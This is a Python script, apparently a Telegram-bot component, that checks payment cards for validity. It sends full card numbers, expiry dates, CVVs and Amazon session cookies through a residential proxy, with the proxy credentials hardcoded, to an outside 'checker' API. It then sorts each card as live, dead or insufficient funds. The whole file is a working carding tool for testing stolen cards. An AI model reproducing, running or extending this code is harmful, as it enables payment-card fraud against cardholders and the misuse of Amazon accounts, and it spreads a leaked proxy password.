import requests
import re

def procesar_tarjeta_amazon(card, cookie):
    session = requests.Session()

    # Proxy settings
    proxy_user = "package-312117-country-mx-isp-altan+redes, s.a.p.i. de c. v."
    proxy_pass = "szwE7mwH0J5yF983"
    proxy_host = "proxy.soax.com"
    proxy_port = 5000

    proxy_url = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"

    session.proxies = {
        "http": proxy_url,
        "https": proxy_url
    }

    url = "https://apis-dpchk.alwaysdata.net/apis/the_crow/Amazon.php"
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://apis-dpchk.alwaysdata.net/apis/the_crow/Amazon.php',
        'Referer': 'https://apis-dpchk.alwaysdata.net/apis/the_crow/Amazon.php'
    }
    data = {
        "lista": card,
        "cookies": cookie
    }

    try:
        response = session.post(url, data=data, headers=headers, timeout=30)
        html = response.text.strip()

        if "Erro ao obter acesso passkey" in html:
            return {
                "status": "error",
                "message": "⚠️ Tu cookie ha expirado. Actualízala desde tu cuenta de Amazon.",
                "cc": card
            }

        bloques = html.split("<br>")
        for bloque in bloques:
            match = re.search(
                r'class="text-(success|danger)">(.*?)</span> \u2794 '
                r'<span class="text-white">(.*?)</span> \u2794 '
                r'<span class="text-(success|danger)">(.*?)</span> \u2794 '
                r'Tempo de resposta: \((.*?)\) \u2794 '
                r'<span class="text-warning">(.*?)</span>',
                bloque
            )
            if match:
                estado, _, tarjeta, _, respuesta, tiempo, usuario = match.groups()
                partes = tarjeta.split()
                if len(partes) < 7:
                    continue

                numero, mm, yyyy, cvv = partes[:4]
                marca = partes[4]
                banco = " ".join(partes[5:-2])
                tipo = partes[-2]
                pais = partes[-1]

                status = "live" if estado == "success" else "dead"

                # Fondos insuficientes
                if "insufficient funds" in respuesta.lower():
                    status = "insufficient_funds"

                mensaje = (
                    f"{'✅ Aprobada' if status == 'live' else '❌ Rechazada'}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"💳 Tarjeta: `{numero}|{mm}|{yyyy}|{cvv}`\n"
                    f"🏦 Banco: {banco}\n"
                    f"💳 Tipo: {marca} • {tipo}\n"
                    f"🌐 País: 🇲🇽 MEXICO\n"
                    f"📌 Institución: {pais}\n"
                    f"📤 Estado: {respuesta.strip()}\n"
                    f"⏱️ Tiempo de respuesta: {tiempo}s\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━"
                )

                return {
                    "status": status,
                    "message": mensaje,
                    "cc": card
                }

        return {
            "status": "error",
            "message": "⚠️ No se pudo extraer respuesta de la API.",
            "cc": card
        }

    except Exception as e:
        return {
            "status": "error",
            "message": f"❌ Error al procesar tarjeta: {str(e)}",
            "cc": card
        }




